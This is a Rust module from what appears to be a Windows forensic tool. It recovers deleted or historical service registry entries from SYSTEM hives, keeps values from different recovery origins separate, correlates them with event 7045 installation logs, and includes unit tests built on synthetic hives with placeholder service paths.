//! Historical service records. A recovered state is not an active service, and
//! values from different recovery origins are never silently combined.
use super::{Coverage, Finding, Scan, checks::CheckDefinition, context::Context};
use evtx::{EvtxParser, ParserSettings};
use registry::{RecoveredKey, Source};
use serde_json::Value;
use std::collections::{BTreeMap, BTreeSet, HashMap};

const MAX_RECOVERY_BYTES: usize = 128 * 1024 * 1024;
const MAX_KEYS: usize = 50_000;
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
struct Snapshot {
    image: Option<String>,
    fields: BTreeMap<String, String>,
    ambiguous: bool,
}
#[derive(Clone, Copy, PartialEq, Eq)]
enum PayloadKind {
    ImagePath,
    ServiceDll,
}
impl PayloadKind {
    fn value_name(self) -> &'static str {
        match self {
            Self::ImagePath => "ImagePath",
            Self::ServiceDll => "ServiceDll",
        }
    }
    fn field(self) -> &'static str {
        match self {
            Self::ImagePath => "imagepath",
            Self::ServiceDll => "servicedll",
        }
    }
}
fn service(path: &str) -> Option<(&str, &str, PayloadKind)> {
    let mut p = path.split('\\');
    let control = p.next()?;
    let services = p.next()?;
    let name = p.next()?;
    let digits = control.get(10..)?;
    if !control.get(..10)?.eq_ignore_ascii_case("ControlSet")
        || digits.len() != 3
        || !digits.bytes().all(|b| b.is_ascii_digit())
        || !services.eq_ignore_ascii_case("Services")
        || name.is_empty()
        || name.contains("[unknown]")
    {
        return None;
    }
    let kind = match p.next() {
        None => PayloadKind::ImagePath,
        Some(child) if child.eq_ignore_ascii_case("Parameters") && p.next().is_none() => {
            PayloadKind::ServiceDll
        }
        _ => return None,
    };
    Some((control, name, kind))
}
fn relevant_field(kind: PayloadKind, field: &str) -> bool {
    field.eq_ignore_ascii_case(kind.field())
        || (kind == PayloadKind::ImagePath
            && matches!(
                field.to_ascii_lowercase().as_str(),
                "start" | "type" | "objectname" | "displayname" | "deleteflag"
            ))
}
fn value_origins(key: &RecoveredKey) -> BTreeSet<String> {
    let kind = service(&key.path).map_or(PayloadKind::ImagePath, |(_, _, kind)| kind);
    key.values
        .iter()
        .filter(|v| relevant_field(kind, &v.name))
        .flat_map(|v| &v.sources)
        .map(Source::name)
        .collect()
}
fn key_only_origins(key: &RecoveredKey) -> BTreeSet<String> {
    let values = value_origins(key);
    if values.is_empty() {
        return BTreeSet::new();
    }
    key.sources
        .iter()
        .map(Source::name)
        .filter(|s| !values.contains(s))
        .collect()
}
fn snapshots(key: &RecoveredKey) -> BTreeMap<Snapshot, BTreeSet<String>> {
    let kind = service(&key.path).map_or(PayloadKind::ImagePath, |(_, _, kind)| kind);
    // A key-only log write supplies provenance, not a second empty value state.
    // If no value data survived anywhere, retain the key-only observation itself.
    let mut origins = value_origins(key);
    if origins.is_empty() {
        origins.extend(key.sources.iter().map(Source::name));
    }
    let mut out = BTreeMap::<Snapshot, BTreeSet<String>>::new();
    for origin in origins {
        let mut values = BTreeMap::<String, BTreeSet<String>>::new();
        let mut damaged = false;
        for v in key
            .values
            .iter()
            .filter(|v| v.sources.iter().any(|s| s.name() == origin))
        {
            let field = v.name.to_ascii_lowercase();
            if !relevant_field(kind, &field) {
                continue;
            }
            let decoded = match (field.as_str(), v.data_type) {
                ("imagepath" | "servicedll" | "objectname" | "displayname", 1 | 2) => {
                    match registry::decode(v.data_type, &v.data) {
                        registry::Data::Text { value, lossy } => {
                            damaged |= lossy;
                            Some(value.trim_end_matches('\0').trim().to_string())
                        }
                        _ => None,
                    }
                }
                ("start" | "type" | "deleteflag", 4) if v.data.len() == 4 => {
                    Some(u32::from_le_bytes(v.data[..4].try_into().unwrap()).to_string())
                }
                _ => None,
            };
            if v.problem.is_some() || decoded.is_none() {
                damaged = true;
            }
            if let Some(value) = decoded {
                values.entry(field).or_default().insert(value);
            }
        }
        let images = values.remove(kind.field()).unwrap_or_default();
        let multiple_images = images.len() > 1;
        let ambiguous = damaged || multiple_images || values.values().any(|v| v.len() > 1);
        let fields = if multiple_images {
            BTreeMap::new()
        } else {
            values
                .into_iter()
                .filter_map(|(k, v)| {
                    if v.len() == 1 {
                        Some((k, v.into_iter().next().unwrap()))
                    } else {
                        None
                    }
                })
                .collect()
        };
        let images: Vec<_> = if images.is_empty() {
            vec![None]
        } else {
            images
                .into_iter()
                .map(|s| (!s.is_empty()).then_some(s))
                .collect()
        };
        for image in images {
            out.entry(Snapshot {
                image,
                fields: fields.clone(),
                ambiguous,
            })
            .or_default()
            .insert(origin.clone());
        }
    }
    out
}
fn description(snapshot: &Snapshot) -> String {
    let start = match snapshot.fields.get("start").map(String::as_str) {
        Some("0") => "0 (boot)",
        Some("1") => "1 (system)",
        Some("2") => "2 (automatic)",
        Some("3") => "3 (demand)",
        Some("4") => "4 (disabled)",
        Some(other) => other,
        None => "unknown",
    };
    format!(
        "Start: {start}; Type: {}; Account: {}; DeleteFlag: {}; DisplayName: {}. {}",
        snapshot
            .fields
            .get("type")
            .map_or("unknown", String::as_str),
        snapshot
            .fields
            .get("objectname")
            .map_or("unknown", String::as_str),
        snapshot
            .fields
            .get("deleteflag")
            .map_or("unknown", String::as_str),
        snapshot
            .fields
            .get("displayname")
            .map_or("unknown", String::as_str),
        if snapshot.ambiguous {
            "Conflicting/damaged fragments: ambiguous metadata omitted; candidate state is incomplete."
        } else {
            "Fields shown together share the same recovery origin; absent fields remain unknown."
        }
    )
}

pub(super) fn run(ctx: &Context, definition: &CheckDefinition) -> Scan {
    let mut scan = Scan::default();
    let mut issues = Vec::new();
    let mut sources = 0;
    let mut keys = 0;
    let mut incomplete = 0;
    let mut display_names = HashMap::<usize, String>::new();
    if let Some(h) = ctx.machine_hive("SYSTEM") {
        sources += 1;
        if h.opened.hive.bytes().len() > MAX_RECOVERY_BYTES {
            issues.push("SYSTEM exceeds 128 MiB historical-recovery safety limit; use parse-registry read --recover-deleted for a dedicated investigation".into());
        } else {
            let recovery = h.opened.hive.recover();
            for key in recovery.keys.iter().filter(|k| service(&k.path).is_some()) {
                let (control, name, kind) = service(&key.path).unwrap();
                if kind == PayloadKind::ServiceDll
                    && !key
                        .values
                        .iter()
                        .any(|v| v.name.eq_ignore_ascii_case("ServiceDll"))
                {
                    continue;
                }
                if keys >= MAX_KEYS || scan.findings.len() >= MAX_KEYS {
                    issues.push("Historical service key limit reached (50000)".into());
                    break;
                }
                keys += 1;
                if !key.path_complete {
                    issues.push(format!("{}: incomplete recovered key path", key.path));
                    continue;
                }
                let key_only = key_only_origins(key)
                    .into_iter()
                    .collect::<Vec<_>>()
                    .join(" | ");
                for (snapshot, origins) in snapshots(key) {
                    if scan.findings.len() >= MAX_KEYS {
                        issues.push("Historical service state limit reached (50000)".into());
                        break;
                    }
                    if snapshot.image.is_none() || snapshot.ambiguous || !key.problems.is_empty() {
                        incomplete += 1;
                    }
                    let origin = origins.into_iter().collect::<Vec<_>>().join(" | ");
                    let mut f = Finding::new(
                        &definition.id,
                        &definition.technique,
                        &definition.mitre_id,
                        format!("HKLM\\SYSTEM\\{}\\{}", key.path, kind.value_name()),
                        snapshot.image.clone().unwrap_or_default(),
                        "UNKNOWN",
                    );
                    f.computer = ctx.computer.clone();
                    f.source_file = h.path.display().to_string();
                    f.references = definition.references.join(" | ");
                    f.key_last_write =
                        crate::registry::filetime(key.last_written).unwrap_or_default();
                    f.record_status = if key.in_use {
                        "historical_service_version"
                    } else {
                        key.status.name()
                    }
                    .into();
                    f.record_identity = format!(
                        "{}:{}:{}:{snapshot:?}:{origin}",
                        key.path, key.last_written, key.in_use
                    );
                    f.access_gained = match snapshot.fields.get("objectname").map(String::as_str) {
                        Some(name)
                            if name.eq_ignore_ascii_case("LocalSystem")
                                || name.eq_ignore_ascii_case("NT AUTHORITY\\SYSTEM") =>
                        {
                            "SYSTEM"
                        }
                        Some(name) if !name.is_empty() => "USER",
                        _ => "UNKNOWN",
                    }
                    .into();
                    f.resolution_unavailable = true;
                    f.resolution_status = "historical_reference".into();
                    f.skip_correlation = true;
                    f.change_evidence = "HISTORICAL_RECORD".into();
                    f.base_classification = Some((
                        "INFO",
                        "Recovered service history; deletion and service registration alone are not evidence of malicious persistence",
                    ));
                    if !snapshot.ambiguous
                        && let Some(image) = &snapshot.image
                    {
                        f.base_classification =
                            super::patterns::command_assessment(image).or(f.base_classification);
                    } else {
                        f.resolution_unavailable = true;
                        f.resolution_status = if snapshot.image.is_some() {
                            "historical_state_incomplete"
                        } else {
                            "historical_image_unavailable"
                        }
                        .into();
                    }
                    f.description = format!(
                        "Recovered service {name} ({}); {}. Recovery: {}; source: {origin}. {} This is historical configuration, not proof of an active service, execution, deletion time, or persistence. Historical payload bytes are not established; a current file at this path is not hashed as the historical payload.",
                        kind.value_name(),
                        if control.eq_ignore_ascii_case(&ctx.active_controlset()) {
                            "current control-set name"
                        } else {
                            "historical/non-selected control set"
                        },
                        key.status.name(),
                        if kind == PayloadKind::ImagePath {
                            description(&snapshot)
                        } else {
                            "ServiceDll recovered independently from the Parameters key; parent ImagePath, account and startup state are not inferred. ".to_string() + &description(&snapshot)
                        }
                    );
                    if !key_only.is_empty() {
                        f.description.push_str(&format!(" Additional key provenance without service values: {key_only}; no value state attributed to these origins."));
                    }
                    if kind == PayloadKind::ImagePath
                        && !snapshot.ambiguous
                        && key.problems.is_empty()
                        && let Some(display) =
                            snapshot.fields.get("displayname").filter(|s| !s.is_empty())
                    {
                        display_names.insert(scan.findings.len(), display.clone());
                    }
                    scan.findings.push(f);
                }
            }
        }
    }
    if ctx.service_event_correlation && !scan.findings.is_empty() {
        corroborate(ctx, &mut scan.findings, &display_names, &mut issues);
    }
    if incomplete > 0 {
        issues.push(format!("{incomplete} service states have incomplete/ambiguous fields; missing values were not filled from current keys or other versions"));
    }
    let mut coverage = Coverage::new(
        &definition.id,
        if sources == 0 {
            "not_collected"
        } else if issues.is_empty() {
            "complete"
        } else {
            "partial"
        },
        format!(
            "{sources} SYSTEM hive(s); {keys} recovered service key records; {} distinct recovered service observations. No active state or historical execution inferred. {}",
            scan.findings.len(),
            issues
                .iter()
                .take(20)
                .cloned()
                .collect::<Vec<_>>()
                .join("; ")
        ),
    );
    coverage.computer = ctx.computer.clone();
    scan.coverage.push(coverage);
    scan
}

fn command_key(ctx: &Context, command: &str) -> Option<(String, Vec<String>)> {
    let root = format!("{}:\\Windows", ctx.original_system_drive());
    let mut expanded = command.to_string();
    for name in ["%systemroot%", "%windir%"] {
        let pattern = regex::Regex::new(&format!("(?i){}", regex::escape(name))).ok()?;
        expanded = pattern
            .replace_all(&expanded, regex::NoExpand(&root))
            .into_owned();
    }
    let mut tokens = super::resolver::tokens(&expanded);
    if tokens.is_empty() {
        return None;
    }
    let mut image = tokens.remove(0);
    for prefix in ["\\\\?\\", "\\??\\"] {
        if let Some(s) = image.strip_prefix(prefix) {
            image = s.to_string();
        }
    }
    Some((image.replace('/', "\\").to_lowercase(), tokens))
}
fn install_key(ctx: &Context, event: &Value) -> Option<(String, (String, Vec<String>))> {
    let system = event.get("System")?;
    if !super::timeline::scalar(system.get("Channel"))?.eq_ignore_ascii_case("system")
        || super::timeline::scalar(system.get("EventID"))? != "7045"
    {
        return None;
    }
    let provider = system.get("Provider")?;
    let name = provider
        .get("#attributes")
        .and_then(|v| v.get("Name"))
        .or_else(|| {
            system
                .get("Provider_attributes")
                .and_then(|v| v.get("Name"))
        })
        .and_then(Value::as_str)?;
    if name != "Service Control Manager" && name != "Microsoft-Windows-ServiceControlManager" {
        return None;
    }
    let computer = super::timeline::scalar(system.get("Computer"))?;
    let identity = super::timeline::host_key(&computer)?;
    if !ctx
        .host_identities()
        .iter()
        .any(|(n, _)| super::timeline::host_key(n).as_deref() == Some(&identity))
    {
        return None;
    }
    let data = event.get("EventData")?;
    let names = super::timeline::named_fields(data, "ServiceName", 0);
    let images = super::timeline::named_fields(data, "ImagePath", 0);
    if names.len() != 1 || images.len() != 1 {
        return None;
    }
    Some((names[0].to_lowercase(), command_key(ctx, &images[0])?))
}
type InstallationKey = (String, (String, Vec<String>));
fn installation_candidates(
    ctx: &Context,
    findings: &[Finding],
    display_names: &HashMap<usize, String>,
) -> HashMap<InstallationKey, Vec<usize>> {
    let mut wanted = HashMap::<InstallationKey, Vec<usize>>::new();
    for (i, f) in findings.iter().enumerate() {
        let Some(name) = f
            .path
            .strip_suffix("\\ImagePath")
            .and_then(|p| p.rsplit('\\').next())
        else {
            continue;
        };
        if let Some(command) = command_key(ctx, &f.value) {
            // Only same-state, unambiguous recovered display names are supplied.
            let names: BTreeSet<_> = std::iter::once(name.to_lowercase())
                .chain(display_names.get(&i).map(|name| name.to_lowercase()))
                .collect();
            for name in names {
                wanted.entry((name, command.clone())).or_default().push(i);
            }
        }
    }
    wanted
}
fn corroborate(
    ctx: &Context,
    findings: &mut [Finding],
    display_names: &HashMap<usize, String>,
    issues: &mut Vec<String>,
) {
    let wanted = installation_candidates(ctx, findings, display_names);
    if wanted.is_empty() {
        return;
    }
    let mut refs = HashMap::<usize, Vec<String>>::new();
    for file in ctx
        .files
        .iter()
        .filter(|f| super::timeline::active_channel_log(ctx, f, "System"))
    {
        let mut parser = match EvtxParser::from_path(&file.physical) {
            Ok(p) => p.with_configuration(ParserSettings::new().num_threads(1)),
            Err(e) => {
                issues.push(format!(
                    "Cannot read service installation log {}: {e}",
                    file.physical.display()
                ));
                continue;
            }
        };
        let mut unreadable = 0;
        for record in parser.records_json_value() {
            let record = match record {
                Ok(r) => r,
                Err(_) => {
                    unreadable += 1;
                    continue;
                }
            };
            let event = record.data.get("Event").unwrap_or(&record.data);
            let Some(key) = install_key(ctx, event) else {
                continue;
            };
            let Some(indices) = wanted.get(&key) else {
                continue;
            };
            for i in indices {
                let refs = refs.entry(*i).or_default();
                if refs.len() < 4 {
                    refs.push(format!(
                        "System 7045 {} RecordID {} at {}",
                        file.physical.display(),
                        record.event_record_id,
                        record.timestamp
                    ));
                }
            }
        }
        if unreadable > 0 {
            issues.push(format!(
                "{}: {unreadable} unreadable service installation events; corroboration incomplete",
                file.physical.display()
            ));
        }
    }
    for (index, refs) in refs {
        findings[index].description.push_str(&format!(" Related installation evidence matches the service key/display name AND complete command: {}. It establishes registration of that name/command, not this recovered version's time or execution.",refs.join(" | ")));
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use registry::{RecoveredStatus, RecoveredValue};
    use std::path::Path;
    fn text(value: &str) -> Vec<u8> {
        value
            .encode_utf16()
            .chain([0])
            .flat_map(u16::to_le_bytes)
            .collect()
    }
    fn value(name: &str, data: &str, source: Source) -> RecoveredValue {
        RecoveredValue {
            name: name.into(),
            data_type: 1,
            size: text(data).len() as u32,
            data: text(data),
            problem: None,
            status: RecoveredStatus::TransactionLogRecovered,
            sources: vec![source],
            replayed: false,
        }
    }
    fn key(values: Vec<RecoveredValue>) -> RecoveredKey {
        RecoveredKey {
            path: r"ControlSet001\Services\EphemeralSvc".into(),
            path_complete: true,
            name: "EphemeralSvc".into(),
            last_written: 133_801_632_000_000_000,
            status: RecoveredStatus::TransactionLogRecovered,
            in_use: false,
            values,
            sources: Vec::new(),
            problems: Vec::new(),
            replayed: false,
        }
    }
    #[test]
    fn separate_log_origins_never_create_a_frankenstein_service_state() {
        let a = Source::LogEntry {
            log: "SYSTEM.LOG1".into(),
            sequence: Some(1),
        };
        let b = Source::LogEntry {
            log: "SYSTEM.LOG1".into(),
            sequence: Some(2),
        };
        let mut first = value("ImagePath", r"C:\old.exe", a.clone());
        let mut second = value("ImagePath", r"C:\new.exe", b.clone());
        first.sources.push(Source::BeforeReplay);
        second.sources.push(Source::FreeCell);
        let old = value("ObjectName", "LocalSystem", a.clone());
        let new = value("ObjectName", r"DOMAIN\deployment", b.clone());
        let old_display = value("DisplayName", "Old display name", a);
        let new_display = value("DisplayName", "New display name", b);
        let states = snapshots(&key(vec![
            first,
            second,
            old,
            new,
            old_display,
            new_display,
        ]));
        for state in states.keys() {
            if state.image.as_deref() == Some(r"C:\old.exe") {
                assert_ne!(
                    state.fields.get("objectname").map(String::as_str),
                    Some(r"DOMAIN\deployment")
                );
                assert_ne!(
                    state.fields.get("displayname").map(String::as_str),
                    Some("New display name")
                );
            }
            if state.image.as_deref() == Some(r"C:\new.exe") {
                assert_ne!(
                    state.fields.get("objectname").map(String::as_str),
                    Some("LocalSystem")
                );
                assert_ne!(
                    state.fields.get("displayname").map(String::as_str),
                    Some("Old display name")
                );
            }
        }
        assert_eq!(states.len(), 4); // Different completeness/provenance remains explicit.
    }
    #[test]
    fn key_only_log_writes_are_provenance_not_duplicate_empty_states() {
        let a = Source::LogEntry {
            log: "SYSTEM.LOG1".into(),
            sequence: Some(244),
        };
        let b = Source::LogEntry {
            log: "SYSTEM.LOG1".into(),
            sequence: Some(247),
        };
        let mut key = key(vec![value("ImagePath", r"C:\service.exe", a.clone())]);
        key.sources = vec![a.clone(), b.clone()];
        let states = snapshots(&key);
        assert_eq!(states.len(), 1);
        assert!(
            states
                .keys()
                .all(|s| s.image.as_deref() == Some(r"C:\service.exe"))
        );
        assert_eq!(states.values().next().unwrap(), &BTreeSet::from([a.name()]));
        assert_eq!(key_only_origins(&key), BTreeSet::from([b.name()]));
        key.values.clear();
        let states = snapshots(&key);
        assert_eq!(states.len(), 1, "retain a genuinely key-only recovery");
        assert!(states.keys().next().unwrap().image.is_none());
        assert_eq!(
            states.values().next().unwrap(),
            &BTreeSet::from([a.name(), b.name()])
        );
    }
    #[test]
    fn parameters_payloads_do_not_inherit_parent_fields_or_other_origin_dlls() {
        let a = Source::LogEntry {
            log: "SYSTEM.LOG1".into(),
            sequence: Some(1),
        };
        let b = Source::LogEntry {
            log: "SYSTEM.LOG1".into(),
            sequence: Some(2),
        };
        let mut key = key(vec![
            value("ServiceDll", r"C:\old.dll", a.clone()),
            value("ServiceDll", r"C:\new.dll", b),
            value("ObjectName", "LocalSystem", a),
        ]);
        key.path.push_str(r"\Parameters");
        let states = snapshots(&key);
        assert_eq!(states.len(), 2);
        assert!(states.keys().all(|s| s.fields.is_empty() && !s.ambiguous));
        assert_eq!(
            states
                .keys()
                .filter_map(|s| s.image.as_deref())
                .collect::<BTreeSet<_>>(),
            BTreeSet::from([r"C:\old.dll", r"C:\new.dll"])
        );
    }
    #[test]
    fn conflicting_values_are_not_silently_selected() {
        let source = Source::FreeCell;
        let states = snapshots(&key(vec![
            value("ImagePath", r"C:\a.exe", source.clone()),
            value("ImagePath", r"C:\b.exe", source.clone()),
            value("ObjectName", "LocalSystem", source),
        ]));
        assert_eq!(states.len(), 2);
        assert!(states.keys().all(|s| s.ambiguous && s.fields.is_empty()));
    }
    #[test]
    fn only_service_root_and_parameters_keys_in_known_control_sets_are_candidates() {
        assert!(service(r"ControlSet001\Services\Example").is_some());
        assert!(service(r"ControlSet001\Services\Example\Parameters").is_some());
        for s in [
            r"ControlSet001\Services\Example\Parameters\Unrelated",
            r"ControlSet001\Services\Example\Unrelated",
            r"ControlSet001\Services\[unknown]",
            r"Software\Services\Example",
            r"CurrentControlSet\Services\Example",
            r"ControlSet001\Services",
        ] {
            assert!(service(s).is_none(), "{s}");
        }
    }
    // Minimal native hive, including a deleted key whose parent chain remains
    // allocated. Its values and value-data cells are free, as after deletion.
    struct Builder {
        bin: Vec<u8>,
    }
    impl Builder {
        fn cell(&mut self, data: &[u8], free: bool) -> u32 {
            let pos = self.bin.len();
            let size = (4 + data.len()).next_multiple_of(8);
            self.bin
                .extend((if free { size as i32 } else { -(size as i32) }).to_le_bytes());
            self.bin.extend(data);
            self.bin.resize(pos + size, 0);
            pos as u32
        }
        fn node(
            &mut self,
            name: &str,
            parent: u32,
            free: bool,
            values: &[(&str, u32, Vec<u8>)],
            children: &[u32],
        ) -> u32 {
            let mut vks = Vec::new();
            for (name, kind, data) in values {
                let mut vk = vec![0; 20];
                vk[..2].copy_from_slice(b"vk");
                vk[2..4].copy_from_slice(&(name.len() as u16).to_le_bytes());
                let (size, offset) = if data.len() <= 4 {
                    let mut b = [0; 4];
                    b[..data.len()].copy_from_slice(data);
                    (data.len() as u32 | 0x80000000, u32::from_le_bytes(b))
                } else {
                    (data.len() as u32, self.cell(data, free))
                };
                vk[4..8].copy_from_slice(&size.to_le_bytes());
                vk[8..12].copy_from_slice(&offset.to_le_bytes());
                vk[12..16].copy_from_slice(&kind.to_le_bytes());
                vk[16..18].copy_from_slice(&1u16.to_le_bytes());
                vk.extend(name.as_bytes());
                vks.push(self.cell(&vk, free));
            }
            let list = if children.is_empty() {
                u32::MAX
            } else {
                let mut d = b"li".to_vec();
                d.extend((children.len() as u16).to_le_bytes());
                for c in children {
                    d.extend(c.to_le_bytes());
                }
                self.cell(&d, false)
            };
            let value_list = if vks.is_empty() {
                u32::MAX
            } else {
                self.cell(
                    &vks.iter().flat_map(|v| v.to_le_bytes()).collect::<Vec<_>>(),
                    free,
                )
            };
            let mut nk = vec![0; 76];
            nk[..2].copy_from_slice(b"nk");
            nk[2..4].copy_from_slice(&0x20u16.to_le_bytes());
            nk[4..12].copy_from_slice(&133_801_632_000_000_000u64.to_le_bytes());
            for (off, n) in [
                (0x10, parent),
                (0x14, children.len() as u32),
                (0x1c, list),
                (0x20, u32::MAX),
                (0x24, vks.len() as u32),
                (0x28, value_list),
                (0x2c, u32::MAX),
                (0x30, u32::MAX),
            ] {
                nk[off..off + 4].copy_from_slice(&n.to_le_bytes());
            }
            nk[72..74].copy_from_slice(&(name.len() as u16).to_le_bytes());
            nk.extend(name.as_bytes());
            self.cell(&nk, free)
        }
    }
    fn hive(command: &str, deleted: bool) -> Vec<u8> {
        hive_with_dll(command, deleted, None)
    }
    fn hive_with_dll(command: &str, deleted: bool, dll: Option<&str>) -> Vec<u8> {
        let mut b = Builder { bin: vec![0; 32] };
        let root = b.node("ROOT", u32::MAX, false, &[], &[]);
        let control = b.node("ControlSet001", root, false, &[], &[]);
        let services = b.node("Services", control, false, &[], &[]);
        let service = b.node(
            "EphemeralSvc",
            services,
            deleted,
            &[
                ("ImagePath", 2, text(command)),
                ("Start", 4, 3u32.to_le_bytes().to_vec()),
                ("Type", 4, 16u32.to_le_bytes().to_vec()),
                ("ObjectName", 1, text("LocalSystem")),
                ("DeleteFlag", 4, 1u32.to_le_bytes().to_vec()),
            ],
            &[],
        );
        if let Some(dll) = dll {
            let params = b.node(
                "Parameters",
                service,
                deleted,
                &[("ServiceDll", 2, text(dll))],
                &[],
            );
            if !deleted {
                let mut li = b"li".to_vec();
                li.extend(1u16.to_le_bytes());
                li.extend(params.to_le_bytes());
                let list = b.cell(&li, false);
                let at = service as usize + 4;
                b.bin[at + 0x14..at + 0x18].copy_from_slice(&1u32.to_le_bytes());
                b.bin[at + 0x1c..at + 0x20].copy_from_slice(&list.to_le_bytes());
            }
        }
        // Set the known allocated parent lists after their child offsets exist.
        for (parent, child) in [(root, control), (control, services)] {
            let mut li = b"li".to_vec();
            li.extend(1u16.to_le_bytes());
            li.extend(child.to_le_bytes());
            let list = b.cell(&li, false);
            let at = parent as usize + 4;
            b.bin[at + 0x14..at + 0x18].copy_from_slice(&1u32.to_le_bytes());
            b.bin[at + 0x1c..at + 0x20].copy_from_slice(&list.to_le_bytes());
        }
        if !deleted {
            let mut li = b"li".to_vec();
            li.extend(1u16.to_le_bytes());
            li.extend(service.to_le_bytes());
            let list = b.cell(&li, false);
            let at = services as usize + 4;
            b.bin[at + 0x14..at + 0x18].copy_from_slice(&1u32.to_le_bytes());
            b.bin[at + 0x1c..at + 0x20].copy_from_slice(&list.to_le_bytes());
        }
        let size = (b.bin.len() + 8).next_multiple_of(4096);
        let remaining = size - b.bin.len();
        b.bin.extend((remaining as i32).to_le_bytes());
        b.bin.resize(size, 0);
        b.bin[..4].copy_from_slice(b"hbin");
        b.bin[8..12].copy_from_slice(&(size as u32).to_le_bytes());
        let mut bytes = vec![0; 4096];
        bytes[..4].copy_from_slice(b"regf");
        for (off, n) in [
            (4, 1u32),
            (8, 1),
            (20, 1),
            (24, 5),
            (32, 1),
            (36, root),
            (40, size as u32),
        ] {
            bytes[off..off + 4].copy_from_slice(&n.to_le_bytes());
        }
        bytes[48..60].copy_from_slice(&text("SYSTEM")[..12]);
        let checksum = (0..508).step_by(4).fold(0u32, |a, p| {
            a ^ u32::from_le_bytes(bytes[p..p + 4].try_into().unwrap())
        });
        bytes[508..512].copy_from_slice(&checksum.to_le_bytes());
        bytes.extend(b.bin);
        bytes
    }
    fn scan_native(root: &Path, command: &str, deleted: bool) -> Scan {
        scan_bytes(root, hive(command, deleted))
    }
    fn scan_bytes(root: &Path, bytes: Vec<u8>) -> Scan {
        let path = root.join("Windows/System32/config/SYSTEM");
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(&path, bytes).unwrap();
        let ctx = Context::open(root, true).unwrap();
        let definition = super::super::checks::catalogue()
            .iter()
            .find(|d| d.id == "deleted_services")
            .unwrap();
        let mut scan = run(&ctx, definition);
        let profile =
            super::super::profile::Profile::load(None, super::super::checks::catalogue()).unwrap();
        for f in &mut scan.findings {
            super::super::resolver::enrich(&ctx, f);
            profile.classify(f);
        }
        super::super::timeline::enrich(&ctx, &mut scan.findings, None);
        scan
    }
    #[test]
    fn actual_deleted_hive_recovers_an_informational_historical_service() {
        let dir = tempfile::tempdir().unwrap();
        let scan = scan_native(dir.path(), r"C:\Corp\installer-helper.exe", true);
        assert_eq!(scan.findings.len(), 1, "{:#?}", scan.coverage);
        let f = &scan.findings[0];
        assert_eq!(f.value, r"C:\Corp\installer-helper.exe");
        assert_eq!(f.severity, "INFO");
        assert_eq!(f.access_gained, "SYSTEM");
        assert_eq!(f.record_status, "deleted_complete");
        assert!(f.description.contains("free_cell"));
        assert!(f.description.contains("3 (demand)"));
        assert!(f.last_change.is_empty());
        assert_eq!(f.change_evidence, "HISTORICAL_RECORD");
        assert_eq!(scan.coverage[0].status, "complete");
    }
    #[test]
    fn native_deleted_parameters_expose_the_dll_as_an_independent_historical_row() {
        let dir = tempfile::tempdir().unwrap();
        let command = r"%SystemRoot%\system32\svchost.exe -k netsvcs";
        let dll = r"C:\ProgramData\Updater\payload.dll";
        let scan = scan_bytes(dir.path(), hive_with_dll(command, true, Some(dll)));
        assert_eq!(scan.findings.len(), 2, "{:#?}", scan.coverage);
        let f = scan
            .findings
            .iter()
            .find(|f| f.path.ends_with(r"\Parameters\ServiceDll"))
            .unwrap();
        assert_eq!(f.value, dll);
        assert_eq!(f.severity, "INFO");
        assert_eq!(f.access_gained, "UNKNOWN");
        assert_eq!(f.record_status, "deleted_complete");
        assert!(f.sha256.is_empty() && f.exists.is_none() && f.last_change.is_empty());
        assert!(f.description.contains("recovered independently"));
        assert!(f.description.contains("free_cell"));
        assert!(f.description.contains("Start: unknown"));
        assert!(f.description.contains("Account: unknown"));
        assert_eq!(f.change_evidence, "HISTORICAL_RECORD");
        assert!(
            scan_bytes(dir.path(), hive_with_dll(command, false, Some(dll)))
                .findings
                .is_empty()
        );
    }
    #[test]
    fn unrelated_parameters_values_do_not_create_empty_dll_findings() {
        let dir = tempfile::tempdir().unwrap();
        let mut bytes = hive_with_dll(r"C:\service.exe", true, Some(r"C:\payload.dll"));
        let at = bytes.windows(10).position(|w| w == b"ServiceDll").unwrap();
        bytes[at..at + 10].copy_from_slice(b"OtherValue");
        let scan = scan_bytes(dir.path(), bytes);
        assert_eq!(scan.findings.len(), 1);
        assert!(scan.findings[0].path.ends_with(r"\ImagePath"));
    }
    #[test]
    fn installation_matching_accepts_same_state_display_name_but_not_another_command() {
        let dir = tempfile::tempdir().unwrap();
        let ctx = Context::open(dir.path(), true).unwrap();
        let f = Finding {
            path: r"HKLM\SYSTEM\ControlSet001\Services\gupdate\ImagePath".into(),
            value: r#""C:\Program Files\Google\Update\GoogleUpdate.exe" /svc"#.into(),
            ..Default::default()
        };
        let display = HashMap::from([(0, "Google Update Service (gupdate)".into())]);
        let candidates = installation_candidates(&ctx, &[f], &display);
        let command = command_key(
            &ctx,
            r#""C:\Program Files\Google\Update\GoogleUpdate.exe" /svc"#,
        )
        .unwrap();
        assert_eq!(
            candidates.get(&(display[&0].to_lowercase(), command.clone())),
            Some(&vec![0])
        );
        assert_eq!(candidates.get(&("gupdate".into(), command)), Some(&vec![0]));
        assert!(
            !candidates.contains_key(&(
                display[&0].to_lowercase(),
                command_key(
                    &ctx,
                    r#""C:\Program Files\Google\Update\GoogleUpdate.exe" /other"#
                )
                .unwrap()
            ))
        );
    }
    #[test]
    fn recovered_service_never_borrows_current_payload_bytes() {
        let dir = tempfile::tempdir().unwrap();
        let payload = dir.path().join("Corp/installer-helper.exe");
        std::fs::create_dir_all(payload.parent().unwrap()).unwrap();
        std::fs::write(
            &payload,
            b"This is a newer replacement, not historical bytes",
        )
        .unwrap();
        let scan = scan_native(dir.path(), r"C:\Corp\installer-helper.exe", true);
        let f = &scan.findings[0];
        assert!(f.sha256.is_empty());
        assert!(f.exists.is_none());
        assert!(f.signer.is_empty());
        assert_eq!(f.resolution_status, "historical_reference");
        assert_eq!(f.signer_status, "not_available");
    }
    #[test]
    fn installation_evidence_requires_local_computer_provider_name_and_complete_command() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("client_info.json"),
            br#"{"hostname":"LABDC","fqdn":"labdc.example.test"}"#,
        )
        .unwrap();
        let ctx = Context::open(dir.path(), true).unwrap();
        let computer = ctx.computer.clone();
        let mut event = serde_json::json!({
            "System": {"Channel":"System", "EventID":7045,
                "Provider":{"#attributes":{"Name":"Service Control Manager"}},
                "Computer":computer},
            "EventData":{"ServiceName":"EphemeralSvc", "ImagePath":r"%systemroot%\svc.exe -enc AbCd"}
        });
        let expected = install_key(&ctx, &event).expect("same host installation");
        assert_eq!(expected.0, "ephemeralsvc");
        assert_eq!(
            Some(expected.1),
